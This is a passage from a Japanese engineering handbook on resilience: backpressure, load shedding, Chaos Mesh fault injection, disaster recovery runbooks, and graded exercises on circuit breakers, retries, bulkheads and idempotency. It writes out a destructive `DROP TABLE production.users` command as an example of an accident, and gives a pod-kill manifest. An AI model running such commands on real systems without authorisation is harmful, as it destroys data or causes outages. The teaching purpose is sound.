// GOOD: トランザクションIDで重複を検知
await db.$transaction(async (tx) => {
  const existing = await tx.transaction.findUnique({ where: { id: txId } });
  if (existing) return existing;  // 既に処理済み
  return await tx.transaction.create({ data: { id: txId, ...data } });
});
```

<a id="section-26-11"></a>
### 26.11 バックプレッシャー ― 過負荷の連鎖を防ぐ
<!-- handbook:learning {"level":"required","minutes":15} -->
<!-- handbook:index {"group":"B","term":"Backpressure (バックプレッシャー)"} -->
<!-- handbook:index {"group":"L","term":"Load Shedding"} -->
<!-- handbook:index {"group":"は行","term":"バックプレッシャー"} -->

<!-- handbook:narrative-bridge {"section":"26.11"} -->
リトライを安全にしても、到着量が処理能力を超えればキューは増え続ける。バックプレッシャーは、下流の処理可能量を上流へ伝え、待機、拒否、負荷遮断を制御する。

Producer が Consumer より速いと、間のキューが無限に膨らみ、メモリ枯渇する。**バックプレッシャー**は「下流の能力に応じて上流を抑制する」仕組み。

#### Node.js Stream のバックプレッシャー

```typescript
import { pipeline } from 'node:stream/promises';
import { createReadStream, createWriteStream } from 'node:fs';
import { Transform } from 'node:stream';

// 巨大ファイルを変換しながらコピー
await pipeline(
  createReadStream('huge-input.txt'),
  new Transform({
    transform(chunk, _enc, cb) {
      cb(null, chunk.toString().toUpperCase());
    },
  }),
  createWriteStream('huge-output.txt'),
);
// pipeline が自動的にバックプレッシャーを処理
// → ディスクI/Oが遅ければ読み取りも自動で止まる
```

#### キュー深さの監視と制御

```typescript
// BullMQ で「キュー深さがしきい値超えたら受付停止」
class RateLimitedQueue {
  constructor(private queue: Queue, private maxDepth: number) {}

  async enqueue(jobName: string, data: object): Promise<void> {
    const counts = await this.queue.getJobCounts('waiting', 'active');
    const totalDepth = counts.waiting + counts.active;
    if (totalDepth >= this.maxDepth) {
      throw new Error(`Queue full (${totalDepth}/${this.maxDepth})`);
    }
    await this.queue.add(jobName, data);
  }
}

// HTTP ハンドラ側
app.post('/api/enqueue-job', async (req, res) => {
  try {
    await jobQueue.enqueue('process', req.body);
    res.status(202).json({ accepted: true });
  } catch (e) {
    if ((e as Error).message.startsWith('Queue full')) {
      return res.status(503).set('Retry-After', '30').json({ error: 'busy' });
    }
    throw e;
  }
});
```

**HTTP 503 + Retry-After ヘッダ**で「**いま無理、30秒後に来て**」と明確にクライアントに伝える。クライアントは指数バックオフでリトライする。

#### Load Shedding (負荷遮断)

過負荷時に**一部のリクエストを意図的に捨てる**戦略。優先度の低いリクエスト (ヘルスチェック以外の集計、推薦など) を犠牲にして、コア機能 (注文、決済) を守る。

```typescript
class PriorityRateLimiter {
  constructor(private redis: Redis) {}

  async allow(priority: 'critical' | 'normal' | 'low'): Promise<boolean> {
    const cpuLoad = await getCpuLoad();   // 0-1
    if (cpuLoad > 0.9 && priority === 'low') return false;
    if (cpuLoad > 0.95 && priority === 'normal') return false;
    // critical は常に通す
    return true;
  }
}

app.get('/api/recommendations', async (req, res) => {
  if (!await limiter.allow('low')) {
    return res.status(503).json({ error: 'Service degraded' });
  }
  // ...
});
```

<a id="section-26-12"></a>
### 26.12 Chaos Engineering ― 壊れる前に壊す
<!-- handbook:learning {"level":"advanced","minutes":10} -->
<!-- handbook:index {"group":"C","term":"Chaos Engineering"} -->
<!-- handbook:index {"group":"か行","term":"カオスエンジニアリング"} -->
<!-- handbook:index {"group":"あ行","term":"異常検知 (Chaos)"} -->

<!-- handbook:narrative-bridge {"section":"26.12"} -->
これらの耐障害パターンは、想定した故障に対して設計どおり動くかを実環境で確かめる必要がある。Chaos Engineeringは、制御された故障を注入し、観測、隔離、復旧の仮説を検証する。

「**本番で壊れたとき初めて気付く**」を防ぐため、**意図的に故障を発生させて耐性を確認**する手法。Netflix の Chaos Monkey [Basiri et al., 2016] が代表例。

#### 試すべき故障シナリオ

- **インスタンス停止**: 1台のPodを kill しても、サービスは継続するか
- **ネットワーク遅延**: 100ms 追加で全体が破綻しないか
- **DNS 失敗**: 名前解決ができない時間帯
- **DB 切断**: コネクションが切れたとき適切にエラーを返すか
- **依存サービスダウン**: 外部APIが応答しないときフォールバックがあるか
- **ディスク満杯**: ログが書けない状況で何が起きるか

#### 実装ツール

- **Chaos Mesh** (Kubernetes 向け): YAML で故障を宣言
- **Gremlin**: SaaS、UI から簡単に故障注入
- **Toxiproxy**: 開発環境で TCP プロキシを介して故障注入
- **AWS Fault Injection Simulator (FIS)**: AWS環境用

```yaml
# Chaos Mesh で Pod を1回だけランダムに kill する。
# namespace は staging を指している。本番へ向けるのは、この節の最後にある
# 前提条件をすべて満たしてからにすること
apiVersion: chaos-mesh.org/v1alpha1
kind: PodChaos
metadata:
  name: random-pod-kill
  namespace: staging
spec:
  action: pod-kill
  mode: one                 # 一度に落とすのは1Podだけ (ブラスト半径の制限)
  selector:
    namespaces: [staging]
    labelSelectors:
      app: web-app
  duration: '10m'
```

定期実行は Chaos Mesh v2 以降 `kind: Schedule` へ分離されている。上のマニフェストを `Schedule` で包むと繰り返し実行になるが、**繰り返しにするのは手動実行で結果を確認したあと**にする。

このマニフェストを本番へ向ける前に、次がそろっている必要がある。

- 対象の Deployment に PodDisruptionBudget があり、同時に落ちる数の下限が決まっている
- `kubectl delete podchaos <name>` で即座に止められることを staging で確認済みである
- 実施時間帯がオンコール担当と合意されていて、担当者が対応できる状態にある
- 影響を判定するダッシュボードとアラートが事前に用意されている
- 実施の記録 (いつ、何を、どう戻したか) を残す手順が決まっている

これらが1つでも欠けている状態で本番の namespace を指すと、それは検証ではなく単なる障害である。

#### Chaos の原則

1. **本番でやる勇気** (ただし最初は staging で)
2. **ブラスト半径を制御** (1%のトラフィックだけ)
3. **アボートできるようにしておく** (緊急停止スイッチ)
4. **業務時間内にやる** (深夜に壊して気づくと最悪)
5. **仮説を立ててから実験** ― 「Aサービスが落ちても、Bは動き続けるはず」を検証
6. **記録と振り返り** (見つかった脆弱性は必ず修正)

「**まだ本番で起きていない故障は、いずれ起きる**」 ― この前提でシステムを設計する。

<a id="section-26-13"></a>
### 26.13 ディザスタリカバリ (DR) ― 「最悪の事態」への備え
<!-- handbook:learning {"level":"practical","minutes":10} -->
<!-- handbook:index {"group":"A","term":"AWS RDS"} -->
<!-- handbook:index {"group":"D","term":"DR (Disaster Recovery)"} -->
<!-- handbook:index {"group":"P","term":"PITR (Point-in-Time Recovery)"} -->
<!-- handbook:index {"group":"R","term":"RPO/RTO"} -->
<!-- handbook:index {"group":"た行","term":"ディザスタリカバリ"} -->
<!-- handbook:index {"group":"さ行","term":"冗長性"} -->

<!-- handbook:narrative-bridge {"section":"26.13"} -->
小さな故障を制御できても、リージョン障害、データ破損、長時間停止では通常運用の回復手段を失う。DRは、許容できるデータ損失と復旧時間を RPO (Recovery Point Objective)・RTO (Recovery Time Objective) として先に定める。

リージョン全体の障害、データセンター火災、ランサムウェア感染、誤って `DROP TABLE production.users` を実行 ― これらに対する備えがDR。

#### RPO と RTO

- **RPO (Recovery Point Objective)**: どこまでデータロスを許容するか (例: 1時間)
- **RTO (Recovery Time Objective)**: どれだけの時間で復旧するか (例: 4時間)

RPO 0 (データロス0) と RTO 0 (即時復旧) は理想だが、コストが指数的に上がる。ビジネス要件で現実的な目標を決める。

#### バックアップ戦略

**3-2-1 ルール:**

- **3 つのコピー** (本番含む)
- **2 種類のメディア** (S3 + 物理 など)
- **1 つはオフサイト** (別リージョンや別クラウド)

```bash
# Postgres 日次バックアップ (S3 へ)
pg_dump -Fc production_db | aws s3 cp - s3://backups/prod/$(date +%Y%m%d).dump

# ライフサイクルポリシー: 30日後 Glacier、365日後 Deep Archive
```

#### Point-in-Time Recovery (PITR)

「**昨日の14:23 の状態に戻したい**」を可能にする仕組み。WAL (Write-Ahead Log) を継続的にバックアップしておけば、任意の時点に復元できる。

```bash
# AWS RDS なら標準機能
aws rds restore-db-instance-to-point-in-time \
  --source-db-instance-identifier prod-db \
  --target-db-instance-identifier prod-db-restored \
  --restore-time 2026-05-20T14:23:00Z
```

ランサムウェア対策に特に重要 ― 「気づいたら全テーブルが暗号化されていた」のような事態でも、数時間前の状態に戻せる。

#### マルチリージョン構成

| 構成 | RPO/RTO | コスト | 複雑度 |
|---|---|---|---|
| Active-Passive (Pilot Light) | 数時間 | 中 | 低 |
| Active-Passive (Warm Standby) | 分単位 | 高 | 中 |
| Active-Active (マルチリージョン) | 秒単位 | 非常に高 | 高 |

ほとんどのスタートアップは Pilot Light で十分。Active-Active は金融や グローバルSaaS で本当に必要になってから。

#### ランブック (Runbook) の整備

DR は「**手順書がなければ、ある人が休暇中に発生したら復旧できない**」。必ず文書化する。

```markdown
# DB Failover Runbook

## トリガー条件
- Primary RDS の Status が 5分間 unavailable
- またはマネージャ承認

## 手順 (推定所要時間: 30分)
0. 昇格の前にレプリカラグを確認し、記録する (`ReplicaLag` メトリクス)。
   非同期レプリケーションでは、この遅延ぶんの更新が失われる。
   これが「設計上のRPO」ではなく「この障害での実効RPO」になる。
   昇格は取り消せない。昇格したレプリカを元のPrimaryへ戻すことはできず、
   再構築が必要になる。昇格自体に再起動が入るため、下の30分にはその時間も含める
1. Slack #incident チャネルに通知 (テンプレート: ...)
2. Read Replica を Promote (`aws rds promote-read-replica ...`)
3. DNS を新Primary に切り替え (`aws route53 change-resource-record-sets ...`)
4. アプリの DATABASE_URL を更新 (Kubernetes Secret 更新)
5. Pod を再起動 (`kubectl rollout restart deployment/web-app`)
6. ヘルスチェック確認
7. ステータスページを更新

## ロールバック
- 旧 Primary が復旧したら、新しい Read Replica として組み込む
- Cut-over は次のメンテナンス時間に
```

**定期訓練**: 年に2回、本番相当の環境で実際に手順を回す。実際にやってみないと手順の漏れは見つからない。

---

<a id="section-26-14"></a>
### 26.14 設計時の判断ポイント
<!-- handbook:learning {"level":"required","minutes":5} -->
<!-- handbook:index {"group":"Y","term":"YAGNI"} -->

<!-- handbook:narrative-bridge {"section":"26.14"} -->
個々の技法を知っても、すべてを導入すればよいわけではない。設計判断では、現在の制約、障害影響、組織能力、運用コストを比較し、単純さを失う価値があるかを評価する。

規模の目安を先に置く。ユーザー数は**月間アクティブ利用者 (MAU)** で数え、あわせてピーク時のRPSとデータ量を見る。同じMAUでも、業務ツール (平日9時に集中) と消費者向け (常時分散) ではピークが桁で違うため、ユーザー数だけで決めない。

| 規模 (MAU) | ピークRPSの目安 | データ量の目安 | アプローチ |
|---|---|---|---|
| 数千〜10万 | 〜50 | 〜100GB | モノリス + PostgreSQL、PaaS で運用 |
| 10万〜100万 | 50〜500 | 100GB〜1TB | モジュラモノリス、Replica、CDN、キャッシュ層 |
| 100万〜1000万 | 500〜5000 | 1TB〜10TB | 分離開始 (重い処理だけサービス化)、シャード検討 |
| 1000万〜 | 5000〜 | 10TB〜 | マイクロサービス、複数DB、専用インフラ |

行を選んだあと、次の4点で確かめる。1つでも合わなければ、規模ではなくその制約が設計を決める。

| 確認 | 何を見るか | 合わないときに効く手 |
|---|---|---|
| 読み書きの比 | 書き込みが全体の3割を超えるか | キャッシュとレプリカが効かなくなる。分割か書き込み経路の非同期化を先に検討する |
| 障害の影響 | 止まって困る機能はどれか、何分まで許されるか | 影響の大きい機能だけを先に切り出す。全体を分けない |
| 組織の能力 | 運用を担当できる人数と、オンコールを回せるか | 担当できる数を超えてサービスを増やさない。運用コストは人数で決まる |
| 変更の頻度 | どの部分が最も速く変わるか | 変更の速い部分と遅い部分の境界で分ける。技術的な層で分けない |

「**最初から大規模設計**」は典型的なオーバーエンジニアリング。スタートアップは特に、シンプルな構成で速くリリースし、必要が出てから複雑化させる。

YAGNI (You Aren't Gonna Need It) ― 使わない複雑さは入れない。

<a id="section-26-15"></a>
### 26.15 実装課題 ― 耐障害性パターンを実装する
<!-- handbook:learning {"level":"practical","minutes":300} -->

<!-- handbook:narrative-bridge {"section":"26.15"} -->
耐障害性は設定例を読むだけでは身に付かない。実装課題では、故障、遅延、重複、過負荷を注入し、遮断、リトライ、隔離、冪等性、流量制御が連携することを確認する。

第26章ではサーキットブレーカ、リトライ、Bulkhead、タイムアウト、冪等性、バックプレッシャー、Chaos Engineering、DR を見た。本節では各パターンを実装し、「**壊れる前提で動くシステム**」の作り方を体感する。所要時間: 演習カードの推定時間の合計で11時間。

#### 課題26.1: サーキットブレーカ実装 (★★★)

**目的**: Hystrix / resilience4j / opossum 風のサーキットブレーカ。

<!-- handbook:exercise:start {"id":"26.1"} -->
> **演習カード 課題26.1** ― 難易度 ★★★ ／ 推定時間 150分 ／ 必要サービス: なし
>
> **前提**
>
> - 26.6 サーキットブレーカ を読み、Closed / Open / Half-Open の遷移条件を説明できる
> - 26.9 タイムアウト戦略 ― レイヤごとの設定指針 を読み、遮断とタイムアウトの役割分担を確認する
> - 時刻を now 関数として注入し、テストで仮想時間を進める書き方ができる
> - async 関数の try / catch / finally で例外を再送出できる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] failureThreshold 回連続で失敗すると state が OPEN になる
> - [ ] OPEN の間は渡した処理を呼ばずに Circuit is open で即座に reject する
> - [ ] resetTimeoutMs 経過後の最初の呼び出しで HALF_OPEN へ遷移し、実処理が1回だけ試される
> - [ ] HALF_OPEN で successThresholdInHalfOpen 回成功すると CLOSED に戻り、失敗すると即座に OPEN へ戻る
> - [ ] 成功時に失敗カウンタが0にリセットされる
> - [ ] 遮断されていない失敗では、元の例外がそのまま呼び出し元へ伝わる
>
> **期待出力**
>
> - state プロパティが CLOSED と OPEN と HALF_OPEN の3値のいずれかを返す
> - OPEN 時の reject は Circuit is open というメッセージの Error になり、内側の処理は実行されない
> - 仮想時刻を resetTimeoutMs より進めた直後の成功呼び出しで、戻り値が返りつつ state が CLOSED になる
>
> **観察項目**
>
> - OPEN 中の呼び出しが即座に返ることを、実処理の呼び出し回数を数えて確認し、遅い依存へのスレッド滞留が消える効果を読み取る
> - HALF_OPEN で失敗したときに openedAt が更新され、待ち時間が最初から数え直されることを確認する
> - 失敗カウンタを「連続失敗」で数える場合と「一定時間内の失敗率」で数える場合を比べ、間欠的な失敗でどちらが先に開くかを整理する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch26 exec tsx --test --test-name-pattern="circuit breaker" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch26 run test` で章の6件がすべてpassすることを確認する
> 3. 自作実装で now を関数注入し、failureThreshold:2 で2回失敗させて state が OPEN、時刻を resetTimeoutMs 未満だけ進めた呼び出しが Circuit is open で reject されれば遷移が正しいと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 状態機械として先に紙に書く。状態は3つ、遷移のきっかけは「成功」「失敗」「時間経過」の3つだけで、execute の中でこの表を素直に写す
> 2. **構造**: failures と halfOpenSuccesses と openedAt の3つの内部状態を持ち、execute の冒頭で OPEN なら経過時間を見て HALF_OPEN へ昇格するか即 throw するかを決める。try で成功処理、catch で失敗処理を書き、catch では必ず元の例外を再送出する
> 3. **実装の要点**: HALF_OPEN 中の失敗は「閾値まで待つ」のではなく即 OPEN へ戻すのが要点。試験通過中に成功カウンタをリセットし忘れると、次に HALF_OPEN へ入ったとき1回の成功で閉じてしまう
>
> **本番利用時の警告**
>
> - このブレーカはプロセス内の状態しか持たないため、複数インスタンスでは各自が独立に開閉し、実際の依存先へ流れる試験リクエストはインスタンス数倍になる。本番では状態の共有か、インスタンスごとの試験流量の見積もりが要る
> - 遮断だけを入れてタイムアウトを設定しないと、呼び出しが失敗として計上される前に長時間ぶら下がり、ブレーカが開く前にスレッドやコネクションが枯渇する。timeout、retry、bulkhead と組み合わせ、全体の timeout budget として設計する
> - この実装はフォールバック応答もメトリクス出力も持たない。OPEN 中に何を返すか (キャッシュ値、縮退表示、エラー) を決めずに導入すると、遮断がそのまま利用者へのエラーとして露出する
>
> **導線**
>
> - 開始地点: `code/ch26/circuit-breaker.ts`
> - 模範解答: `code/ch26/circuit-breaker.solution.ts`
>
> **推定時間の内訳**: 3状態の遷移実装45分、仮想時刻を使った遷移テストの作成40分、HALF_OPEN の失敗・成功パターンの検証35分、遮断中の呼び出し抑止の観察と記録30分
<!-- handbook:exercise:end -->

**要件**: 3つの状態を持つ:
- **Closed**: 通常動作。失敗を計数。
- **Open**: 一定数の失敗で開く。リクエストは即座にエラー (高速 fail)。
- **Half-Open**: 一定時間後に試験的に通過。成功なら Closed、失敗なら再 Open。

```typescript
const breaker = new CircuitBreaker({
  failureThreshold: 5,        // 連続5回失敗で Open
  resetTimeoutMs: 5000,       // 5秒後に Half-Open
  successThresholdInHalfOpen: 2,
});

await breaker.execute(async () => await fetch('https://flaky-api.example.com'));
// 失敗が閾値を超えると、以降は呼び出さずに即時 throw
```

模範解答: `code/ch26/circuit-breaker.solution.ts`

#### 課題26.2: リトライ + 指数バックオフ + jitter (★★)

**目的**: 「**雷鳴問題 (thundering herd)**」を避けるため、リトライ間隔にランダム性を入れる。

<!-- handbook:exercise:start {"id":"26.2"} -->
> **演習カード 課題26.2** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 26.7 リトライとバックオフ を読み、thundering herd が起きる条件を説明できる
> - 26.10 冪等性とリトライ ― 「もう一度」を安全にする を読み、リトライしてよい操作の条件を確認する
> - 乱数生成関数と sleep を引数で注入してテスト可能にする書き方ができる
> - 指数バックオフの上限 (cap) 計算を式で書ける
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] maxAttempts 回試行しても失敗したら、最後の例外をそのまま throw する
> - [ ] retryableErrors が false を返す例外ではリトライせず即座に throw する
> - [ ] jitter が none のとき待ち時間が baseDelayMs × 2の (試行回数-1) 乗 になり、maxDelayMs で頭打ちになる
> - [ ] jitter が full のとき待ち時間が 0 以上 cap 以下の乱数になる
> - [ ] jitter が equal のとき待ち時間が cap/2 以上 cap 以下になる
> - [ ] random と sleep を注入した状態で、待ち時間の系列が決定的に再現する
>
> **期待出力**
>
> - baseDelayMs:10, maxDelayMs:100, jitter:'full', random:()=>0.5 で3回目に成功する処理を実行すると、sleep へ渡る待ち時間が 5 と 10 の2件になる
> - 成功した時点で以降のリトライが行われず、戻り値がそのまま返る
> - decorrelated では直前の待ち時間を基準に次の待ち時間が決まり、系列が単調な指数列にならない
>
> **観察項目**
>
> - 同じ乱数列で jitter を none / equal / full / decorrelated と切り替え、待ち時間の分散がどう広がるかを並べて記録する
> - 複数クライアントが同時に失敗する状況を模擬し、jitter なしではリトライ時刻が一点に集中することを確認する
> - cap の計算が試行回数に対して指数的に伸び、maxDelayMs で打ち切られる位置を確認する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch26 exec tsx --test --test-name-pattern="retry applies attempts" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch26 run test` で章の6件がすべてpassすることを確認する
> 3. 自作実装で sleep を記録用の関数に差し替え、待ち時間の配列を出力して jitter 種別ごとの範囲に収まっていれば合格とする
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 実際に待つ実装のままではテストが遅く不安定になる。sleep と random を最初からオプションとして受け取り、デフォルト値を本物にする設計にすると検証が一気に楽になる
> 2. **構造**: for ループの中で try / catch し、catch では「試行上限に達したか」と「リトライ対象の例外か」の2条件で即 throw を判断する。cap = min(maxDelayMs, baseDelayMs * 2 ** (attempt - 1)) を計算してから jitter 種別で待ち時間を決める
> 3. **実装の要点**: decorrelated だけは直前の待ち時間を保持して次に使うため、ループの外に previous 変数が要る。また previous に「jitter 適用後の値」を入れるか「cap」を入れるかで系列が変わるので、どちらを採るか決めて一貫させる
>
> **本番利用時の警告**
>
> - リトライは冪等な操作にだけ許される。決済や在庫引当のような副作用のある呼び出しへ無条件にこの retry を巻くと、タイムアウトしただけで成功していた処理を二重に実行する。冪等性キー (課題26.4) と組で使う
> - 上限のないリトライや、全クライアントが同時にリトライする構成は、復旧しかけた依存先を再び落とす。maxAttempts と maxDelayMs に加え、全体の timeout budget を超えない設計と、サーキットブレーカによる遮断を併用する
> - この実装は 5xx とネットワークエラーの区別を retryableErrors の実装者に委ねており、デフォルトでは全例外がリトライ対象になる。4xx をリトライ対象に含めたまま本番へ入れると、恒久的な失敗に無駄な負荷をかけ続ける
>
> **導線**
>
> - 開始地点: `code/ch26/retry-jitter.ts`
> - 模範解答: `code/ch26/retry-jitter.solution.ts`
>
> **推定時間の内訳**: リトライループとリトライ判定の実装25分、jitter 4種の計算実装30分、注入した sleep での待ち時間系列の検証20分、種別ごとの分散比較と記録15分
<!-- handbook:exercise:end -->

**要件**:

```typescript
const result = await retry(
  async () => await flakyOperation(),
  {
    maxAttempts: 5,
    baseDelayMs: 100,
    maxDelayMs: 30_000,
    jitter: 'full',  // 'none' | 'equal' | 'full' | 'decorrelated'
    retryableErrors: (err) => err.code === 'ECONNRESET' || err.status >= 500,
  }
);
```

**Jitter 比較**:
- `none`: 全クライアントが同時にリトライ → 再び落とす
- `equal`: 半分固定 + 半分ランダム → 改善
- `full`: 0〜delay でランダム → さらに分散
- `decorrelated`: 過去の delay 基準でランダム → 一番滑らか

模範解答: `code/ch26/retry-jitter.solution.ts`

#### 課題26.3: Bulkhead パターン (★★)

**目的**: 同時実行数を制限し、ある機能の障害が他に伝播しないように隔離。

<!-- handbook:exercise:start {"id":"26.3"} -->
> **演習カード 課題26.3** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 26.8 Bulkhead (隔壁) パターン を読み、同時実行数の制限が障害伝播をどう止めるかを説明できる
> - 26.11 バックプレッシャー ― 過負荷の連鎖を防ぐ を読み、キューと拒否の関係を確認する
> - Promise を外部から resolve する待ち行列 (resolver を配列に積む形) を書ける
> - try / finally で必ず後始末を行う非同期処理を書ける
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] maxConcurrent を超えない範囲では execute が待たされずに実行される
> - [ ] maxConcurrent 超過分はキューへ入り、先行タスクの完了後に順番に実行される
> - [ ] キュー長が maxQueueSize に達した状態でさらに execute を呼ぶと Bulkhead queue full で即座に reject する
> - [ ] タスクが例外を投げても active カウンタが戻り、後続のキューが進む
> - [ ] stats() が active と queued の現在値を返す
> - [ ] 別インスタンスの Bulkhead は互いの同時実行数に影響しない
>
> **期待出力**
>
> - maxConcurrent:1, maxQueueSize:1 のとき、1本目は実行中、2本目はキュー、3本目は Bulkhead queue full で reject という3通りの結果になる
> - 先行タスクを解決すると、キューされていたタスクの Promise が続けて解決する
> - stats() が {active: 実行中の数, queued: 待機中の数} という2キーのオブジェクトを返す
>
> **観察項目**
>
> - 遅い依存を模した長時間タスクを流し込み、Bulkhead なしでは全体の応答が詰まり、ありでは超過分が即座に拒否されて他機能が生き残ることを比較する
> - 2つの Bulkhead を別機能に割り当て、片方を飽和させても他方の処理時間が変わらないことを確認する
> - 拒否 (fail fast) と待機 (キュー) のどちらが利用者にとって良い応答かを、待ち時間とエラー率の両面で整理する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch26 exec tsx --test --test-name-pattern="bulkhead limits queue" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch26 run test` で章の6件がすべてpassすることを確認する
> 3. 自作実装で maxConcurrent:1, maxQueueSize:1 として3本同時に投入し、3本目だけが full で reject されれば制限が効いていると判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: セマフォとして考える。「空きがあれば即実行、なければ待つ、待ち行列も満杯なら断る」という3分岐を execute の冒頭に置くのが骨格になる
> 2. **構造**: active カウンタと、待機中の resolve 関数を並べた配列を持つ。空きがなければ new Promise の resolve を配列へ push して await し、タスク完了後の finally で active を減らして queue.shift() を呼び出す
> 3. **実装の要点**: active の増加をキュー待ちの await より前に書くと同時実行数を超えるので、待機解除の直後に増やす。finally での後始末を怠ると、タスクが例外を投げたときにスロットが永久に埋まったままになる
>
> **本番利用時の警告**
>
> - このキューはタイムアウトを持たないため、先行タスクが返らない限り待機中のタスクは永久に待つ。実サービスではキューの滞留時間にも上限を設け、期限切れを拒否として扱う必要がある
> - 拒否は Bulkhead queue full という汎用エラーで返るだけで、メトリクス出力も、利用者向けの Retry-After のような情報も持たない。可観測性なしに導入すると「なぜか一部リクエストだけ失敗する」状態になり、原因の特定が難しくなる
> - 隔離されるのはこのプロセス内の同時実行数だけで、DBのコネクション数やCPUのような実資源は分離されない。実際の障害伝播を止めるには、コネクションプールやスレッドプールを機能単位で分ける必要がある
>
> **導線**
>
> - 開始地点: `code/ch26/bulkhead.ts`
> - 模範解答: `code/ch26/bulkhead.solution.ts`
>
> **推定時間の内訳**: セマフォと待ち行列の実装30分、満杯時の拒否と後始末の実装20分、遅いタスクを使った隔離効果の観察25分、2つの Bulkhead での独立性確認15分
<!-- handbook:exercise:end -->

**要件**:

```typescript
const bulkhead = new Bulkhead({
  maxConcurrent: 10,
  maxQueueSize: 50,
});

const result = await bulkhead.execute(async () => await callExternalApi());
// → maxConcurrent を超えたらキュー
// → maxQueueSize を超えたら即 reject (高速 fail)
```

機能比較:
- `Semaphore` 風 (同時 N 個まで)
- 別 bulkhead 同士は独立 (片方の遅延が他方に影響しない)
- メトリクス: active、queued (模範解答はこの2つ。拒否件数 rejected の集計は読者の実装範囲)

模範解答: `code/ch26/bulkhead.solution.ts`

#### 課題26.4: 冪等性キー実装 (★★)

**目的**: Stripe API 等の `Idempotency-Key` ヘッダ風の仕組み。

<!-- handbook:exercise:start {"id":"26.4"} -->
> **演習カード 課題26.4** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 26.10 冪等性とリトライ ― 「もう一度」を安全にする を読み、at-least-once 配送と冪等性の関係を説明できる
> - 26.7 リトライとバックオフ を読み、リトライがどこで二重実行を生むかを確認する
> - node:crypto の createHash でリクエスト本文のハッシュを計算できる
> - キーの順序に依存しない安定したJSON文字列化を実装できる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] 同じキーと同じ本文で2回目に呼ぶと、内部の処理関数が実行されず1回目の結果が返る
> - [ ] 同じキーで異なる本文を渡すと Idempotency key reused with different body で例外になる
> - [ ] 本文のキー順序を入れ替えても同一とみなされる (安定した正規化を行っている)
> - [ ] ttlSec を過ぎた記録は再利用されず、処理が改めて実行される
> - [ ] 1回目の処理が失敗したときは記録が削除され、同じキーでリトライできる
> - [ ] 1回目が完了する前に同じキーで呼ばれた場合、同じ Promise が共有されて処理は1回だけ走る
>
> **期待出力**
>
> - 同じキーで2回 execute した結果が同値で、副作用カウンタが1のままになる
> - 本文違いの3回目は reject となり、副作用カウンタは増えない
> - 内部の記録が key ごとに hash と expires と promise を持つ
>
> **観察項目**
>
> - 結果ではなく Promise を保存していることを確認し、同時到着した重複リクエストが1回の処理に合流する (in-flight の合流) 仕組みを読み取る
> - 失敗時に記録を削除する分岐を外し、一時的なエラーが TTL の間ずっと返り続けるようになることを再現する
> - 本文のハッシュ検証を外し、同じキーで異なる金額を送ったときに誤った結果が返ることを確認する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch26 exec tsx --test --test-name-pattern="idempotency caches" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch26 run test` で章の6件がすべてpassすることを確認する
> 3. 自作実装で副作用カウンタを持つ処理を同じキーで3回呼び、カウンタが1のままで3回目だけ本文違いにすると reject されれば合格とする
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 「同じキーなら同じ結果」を返すだけでは足りない。同じキーで違う内容が来たら誤って再利用しないよう、本文の同一性も鍵の一部として扱う設計から始める
> 2. **構造**: キーを Map の鍵にし、値として 本文ハッシュ と 有効期限 と 実行中の Promise を保存する。execute は既存記録が有効期限内かを見て、ハッシュ一致なら保存済み Promise を返し、不一致なら例外にする
> 3. **実装の要点**: 結果ではなく Promise を保存するのが要点で、これにより完了前の重複リクエストも合流できる。ただし失敗した Promise を残すとリトライできなくなるので、catch で記録を削除してから例外を再送出する
>
> **本番利用時の警告**
>
> - この記録はプロセス内の Map にあり、再起動で全消失し、複数インスタンス間でも共有されない。実際の決済APIでは、記録の書き込みと副作用の実行を同一トランザクションか外部の共有ストアで結び付けないと二重課金が起きる
> - TTL は expires の比較だけで、期限切れエントリの掃除を行わない。長時間稼働するとキー数に比例して Map が増え続け、メモリ枯渇の原因になる
> - 冪等性キーはクライアントが正しく生成・再利用することが前提で、この実装はキーの形式も推測困難性も検証しない。連番のようなキーを許すと、他人のリクエスト結果を引き当てられる情報漏えいになりうる
>
> **導線**
>
> - 開始地点: `code/ch26/idempotency.ts`
> - 模範解答: `code/ch26/idempotency.solution.ts`
>
> **推定時間の内訳**: 安定JSON化とハッシュ計算の実装20分、記録の保存と再利用・本文検証の実装30分、失敗時削除と in-flight 合流の検証25分、TTL 挙動の確認15分
<!-- handbook:exercise:end -->

**要件**:
- 同じキーで2回目以降のリクエスト → 1回目の結果を返す
- リクエスト body のハッシュも保存 (同じキーで違うリクエストはエラー)
- 一定期間で expire

```typescript
const store = new IdempotencyStore({ ttlSec: 86_400 });

async function chargePayment(idempotencyKey: string, body: PaymentRequest) {
  return await store.execute(idempotencyKey, body, async () => {
    // 実際の支払い処理(副作用あり)
    return await stripeApi.charge(body);
  });
}

// 1回目: 実行されて結果を保存
const r1 = await chargePayment('key-1', { amount: 1000 });
// 2回目: 同じ key → 保存された結果を返す(再課金しない)
const r2 = await chargePayment('key-1', { amount: 1000 });
// 同じ key だが body が違う → エラー
const r3 = await chargePayment('key-1', { amount: 9999 }); // throws
```

模範解答: `code/ch26/idempotency.solution.ts`

#### 課題26.5: バックプレッシャー (★★★)

